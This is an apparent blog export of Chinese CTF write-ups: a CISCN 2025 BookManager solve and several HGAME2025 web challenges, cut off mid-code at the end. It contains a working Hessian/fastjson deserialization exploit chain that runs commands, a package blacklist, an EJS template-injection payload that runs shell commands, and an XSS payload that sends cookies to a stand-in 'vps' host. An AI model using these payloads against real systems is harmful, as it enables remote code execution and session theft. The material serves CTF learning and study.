ax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.apache.bcel.util.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>pstore.shaded.org.apache.commons.collections.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>对比一下，会发现有个不同的东西，黑名单1有，黑名单2却没有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.print.<br></code></pre></td></tr></table></figure><p>这就是本题的核心绕过点。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>jar包给了fj依赖，下面我贴出的博客中大佬挖出了个solon的链子，中间有个就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.print.UnixPrintServiceLookup<br></code></pre></td></tr></table></figure><p>但是美中不足的是这个必须Unix类操作系统才有，也就是我Windows没法直接调，会显示没这个包。</p><p>Linux和Mac的java环境应该能直接调出来。</p><p>众所周知fj的<code>JSONObject#toString</code>能触发任意getter，我们使用它去调用<code>UnixPrintServiceLookup#getDefaultPrintService</code>，如此链子便拉通了。</p><p>我们从最原始和经典的fj链入手：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject -&gt; <br>HashMap.readObject -&gt; <br>BadAttributeValueExpException.readObject -&gt; <br>JSONArray.toString -&gt; <br>JSON.toString （JSONArray <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JSON</span>）-&gt; <br>JSON.toJSONString -&gt; <br>TemplatesImpl.getOutputProperties -&gt; <br>TemplatesImpl.newTransformer<br></code></pre></td></tr></table></figure><p>但是由于存在黑名单，因此需要进行绕过以下两个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.BadAttributeValueExpException<br>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<br></code></pre></td></tr></table></figure><p>对于 <code>BadAttributeValueExpException</code>，其作用为 <code>from readObject to toStringBean.toString</code>，可以找到未被 blacklist 的 <code>XString.equals</code> 来替换，而最后的 sink 可以使用 <code>UnixPrintServiceLookup</code> 替换，最终的调用链为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">getDefaultPrintService:<span class="hljs-number">640</span>, UnixPrintServiceLookup (sun.print)<br>write:-<span class="hljs-number">1</span>, ASMSerializer_1_UnixPrintServiceLookup (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">271</span>, MapSerializer (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">44</span>, MapSerializer (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">312</span>, JSONSerializer (com.alibaba.fastjson.serializer)<br>toJSONString:<span class="hljs-number">1077</span>, JSON (com.alibaba.fastjson)<br>toString:<span class="hljs-number">1071</span>, JSON (com.alibaba.fastjson)<br>equals:<span class="hljs-number">391</span>, XString (com.sun.org.apache.xpath.internal.objects)<br>equals:<span class="hljs-number">495</span>, AbstractMap (java.util)<br>putVal:<span class="hljs-number">636</span>, HashMap (java.util)<br>put:<span class="hljs-number">613</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>main:<span class="hljs-number">166</span>, Main (org.example)<br></code></pre></td></tr></table></figure><p>Linux下调，确实能通:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XStringtoGetterExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(filedName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//需要执行的命令</span><br>            <span class="hljs-comment">//String cmd = &quot;curl -X POST http://127.0.0.1:8080/api/rest/book/addBook -H \&quot;Content-Type: application/json\&quot; -d &#x27;&#123;\&quot;bookId\&quot;: 1, \&quot;title\&quot;: \&quot;&#x27;$(cat /flag)&#x27;\&quot;, \&quot;author\&quot;: \&quot;&#x27;EddieMurphy&#x27;\&quot;, \&quot;publishDate\&quot;: \&quot;2025-01-01\&quot;, \&quot;price\&quot;: 13.14&#125;&#x27;&quot;;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/success_eddie&quot;</span>;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//Class&lt;?&gt; cls = Class.forName(&quot;sun.print.UnixPrintServiceLookup&quot;);</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//Object unixPrintServiceLookup = unsafe.allocateInstance(cls);</span><br>            <span class="hljs-comment">//设置属性</span><br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br>            <span class="hljs-comment">//封装一个JSONObject对象调用getter方法</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br><br>            <span class="hljs-comment">//使用XString类调用toString方法</span><br>            <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>, jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, jsonObject);<br><br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br>            setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            <span class="hljs-comment">//FileOutputStream fileOutputStream=new FileOutputStream(&quot;ser.bin&quot;);</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(byteArrayOutputStream);<br>            <span class="hljs-comment">//Hessian2OutputWithOverlongEncoding hessianOutput = new Hessian2OutputWithOverlongEncoding(fileOutputStream);</span><br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br>            System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>            des(byteArrayOutputStream.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">des</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(byteArrayInputStream);<br>        System.out.println(<span class="hljs-string">&quot;\nDeserialization of object.&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> hessianInput.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (EOFException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Unexpected end of file while reading object&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205165508392.png" alt="image-20250205165508392"></p><p>当然这是出网打法，而比赛时那道题据说不出网，按道理来说应该是curl将根目录的flag给映射到book页面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;curl -X POST http://127.0.0.1:8080/api/rest/book/addBook -H \&quot;Content-Type: application/json\&quot; -d &#x27;&#123;\&quot;bookId\&quot;: 1, \&quot;title\&quot;: \&quot;&#x27;$(cat /flag)&#x27;\&quot;, \&quot;author\&quot;: \&quot;&#x27;EddieMurphy&#x27;\&quot;, \&quot;publishDate\&quot;: \&quot;2025-01-01\&quot;, \&quot;price\&quot;: 13.14&#125;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    body = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(body))<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getBook&quot;</span><br>headers = &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/hessian&quot;</span> &#125;<br>response = requests.get(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(response.text)<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getAllBooks&quot;</span><br>response = requests.get(url)<br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;flag\&#123;[^\&#125;]+\&#125;&#x27;</span>, response.text)<br><span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">0</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;Flag not found&quot;</span>)<br></code></pre></td></tr></table></figure><p>也可以打内存马（但是没时间看了hhh）。</p><p>高手过招，点到为止吧。</p><p>参考：</p><p><a href="https://github.com/frohoff/jdk8u-jdk/blob/master/src/solaris/classes/sun/print/UnixPrintService.java">jdk8u-jdk&#x2F;src&#x2F;solaris&#x2F;classes&#x2F;sun&#x2F;print&#x2F;UnixPrintService.java at master · frohoff&#x2F;jdk8u-jdk</a></p><p><a href="https://p0lar1ght.github.io/posts/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%9B%BD%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF_WEB_bookmanager%E9%A2%98%E8%A7%A3/#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">第十八届国赛暨第二届长城杯-bookmanager题解 | P0l@R19ht</a></p><p><a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/#/hessian">Hessian UTF-8 Overlong Encoding - X1r0z Blog</a></p><p><a href="https://www.freebuf.com/articles/web/409400.html">国产web框架Solon - FreeBuf网络安全行业门户</a></p><p><a href="https://pankas.top/2024/08/18/%E5%9B%BD%E4%BA%A7web%E6%A1%86%E6%9E%B6solon-v2.5.11rce%E6%BC%8F%E6%B4%9E/">国产web框架Solon-v2.5.11RCE漏洞</a></p><p><a href="https://xz.aliyun.com/news/16315">文章 - 2024 CISCN &amp; 第二届长城杯铁人三项赛 0解Web BookManager 题解 - 先知社区</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2025-WEB</title>
    <link href="/2025/02/04/HGAME2025-WEB/"/>
    <url>/2025/02/04/HGAME2025-WEB/</url>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><p>看看HGAME，确实好题啊。</p><h2 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h2><p>JS题，前端js确实能看到疑似base64的东西，解密后再栅栏解密却是假的flag。</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004112370.png" alt="image-20250205004112370"></p><p>对于它说的10000分，搜它的十六进制，发现有个比较的逻辑，对应0x270f，也就是9999的十六进制。</p><p>从变量能找到<code>_SCORE</code>，那么我们直接在console设置<code>_SCORE=10000</code>，然后死五次就获得了个base64，再栅栏解密得到真正的flag：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004119424.png" alt="image-20250205004119424"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004134993.png" alt="image-20250205004134993"></p><h2 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h2><p>给了个app.js，还有个上传路径。</p><p>其实本地搭好环境就知道文件目录结构是啥，public目录下的东西是被映射到&#x2F;static路由下了，还有个mortis.ejs存在于views目录下。给了个rename路由，其实本地测测可以发现这里可以文件覆盖。意思可以理解为linux命令中的mv。</p><p>本来直接rename根目录下的flag到&#x2F;static那个路由下的图片就出了，但是它本地根目录没放flag，估计在环境变量或者要R。</p><p>这里有几种常规做法，第一种就是前面说的直接传过去，但是失败。第二种是写计划任务看能不能弹个shell，第三种就是用它的ejs来打SSTI直接模板注入了，因为源码中写出了render这一渲染逻辑。</p><p>这里用的就是第三种方法，可以R。</p><p><a href="https://xz.aliyun.com/news/11769">文章 - Ejs模板引擎注入实现RCE - 先知社区</a></p><p><a href="https://www.cnblogs.com/hackerone/p/17216027.html">hxp ctf valentine ejs ssti 语法特性造成的漏洞 - Galio - 博客园</a></p><p>本来我想造个内存马，但是好像需要app.js的配合，但是已经启动的服务覆盖了app.js也没用，需要重启。所以只能一次渲染成功。</p><p>测了下，机子没bash，有nc，但不出网：</p><p><img src="/2025/02/04/HGAME2025-WEB/14729c69a51b19f1ed0687a9cfad0f07.png" alt="img"></p><p>直接读env到&#x2F;static目录算了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%= <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;env &gt; /app/public/1.txt&quot;</span>) %&gt;<br></code></pre></td></tr></table></figure><p>先上传到uploads目录，然后直接覆盖：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005044113.png" alt="image-20250205005044113"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004640527.png" alt="image-20250205004640527"></p><p>其实也可以直接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%= process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> %&gt;<br></code></pre></td></tr></table></figure><p>虽然算事后诸葛亮了，因为如果不在环境变量，阁下该如何应对？还是得R啊。</p><h2 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h2><p>简单的XSS。</p><p>登录提示其实就是弱密码，888888进了。</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005445100.png" alt="image-20250205005445100"></p><p>然后发现有个留言板，抓包有cookie，留言板写xss的payload能弹框。</p><p>扫路径发现个&#x2F;admin，提示是admin会来看留言板，那么思路就是先在留言板写个外带cookie的payload，然后访问&#x2F;admin，vps会接收到admin访问的admin_cookie。</p><p>再带admin_cookie扫路径可以发现&#x2F;flag路径，带cookie访问获得flag：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://vps/?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005355739.png" alt="image-20250205005355739"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005419060.png" alt="image-20250205005419060"></p><h2 id="Level-25-双面人派对"><a href="#Level-25-双面人派对" class="headerlink" title="Level 25 双面人派对"></a>Level 25 双面人派对</h2><p>给了俩url，开始以为是k8s，但是确实也有渊源。</p><p>下面那个可以直接读到一个main文件，不知道啥玩意，但是file查看得知是个elf，直接运行一下看看：</p><p><img src="/2025/02/04/HGAME2025-WEB/c5db86a0024278a4bfd51621332b1387.png" alt="img"></p><p>发现是个go编译的，会一直访问localhost:9000的桶子。</p><p>提示那个女人，应该是IDA给它逆一下，UPX加壳了，脱一下就行了。</p><p>IDA打开，搜索字符串发现了硬编码的ACCESS_KEY和SECRET_KEY，用的minio集群分布：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205010009560.png" alt="image-20250205010009560"></p><p>搜一下minio的操作手册，获得了这俩玩意其实可以直接admin登录看桶子。可以用python-sdk交互也可以下mc来命令行交互，还可以编译个console来图形化操作。</p><p>连接第一个url，会发现有hint和prodbucket两个桶子，hint里给了源码，prodbucket桶子里给了个update对象，也是个elf文件，导下来发现这个elf就是我们前面获得的main文件。</p><p>那么可以尝试更新这个update为我们自己导入的恶意服务。然而这个服务还是不出网emm</p><p>看了下源码，发现对上第二个url的服务是打开了当前目录下的文件读取，那么我们直接改一下再编译成新的elf：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;level25/fetch&quot;</span><br><br><span class="hljs-string">&quot;level25/conf&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fetcher := &amp;fetch.MinioFetcher&#123;<br>Bucket:    conf.MinioBucket,<br>Key:       conf.MinioKey,<br>Endpoint:  conf.MinioEndpoint,<br>AccessKey: conf.MinioAccessKey,<br>SecretKey: conf.MinioSecretKey,<br>&#125;<br>overseer.Run(overseer.Config&#123;<br>Program: program,<br>Fetcher: fetcher,<br>&#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>g := gin.Default()<br><span 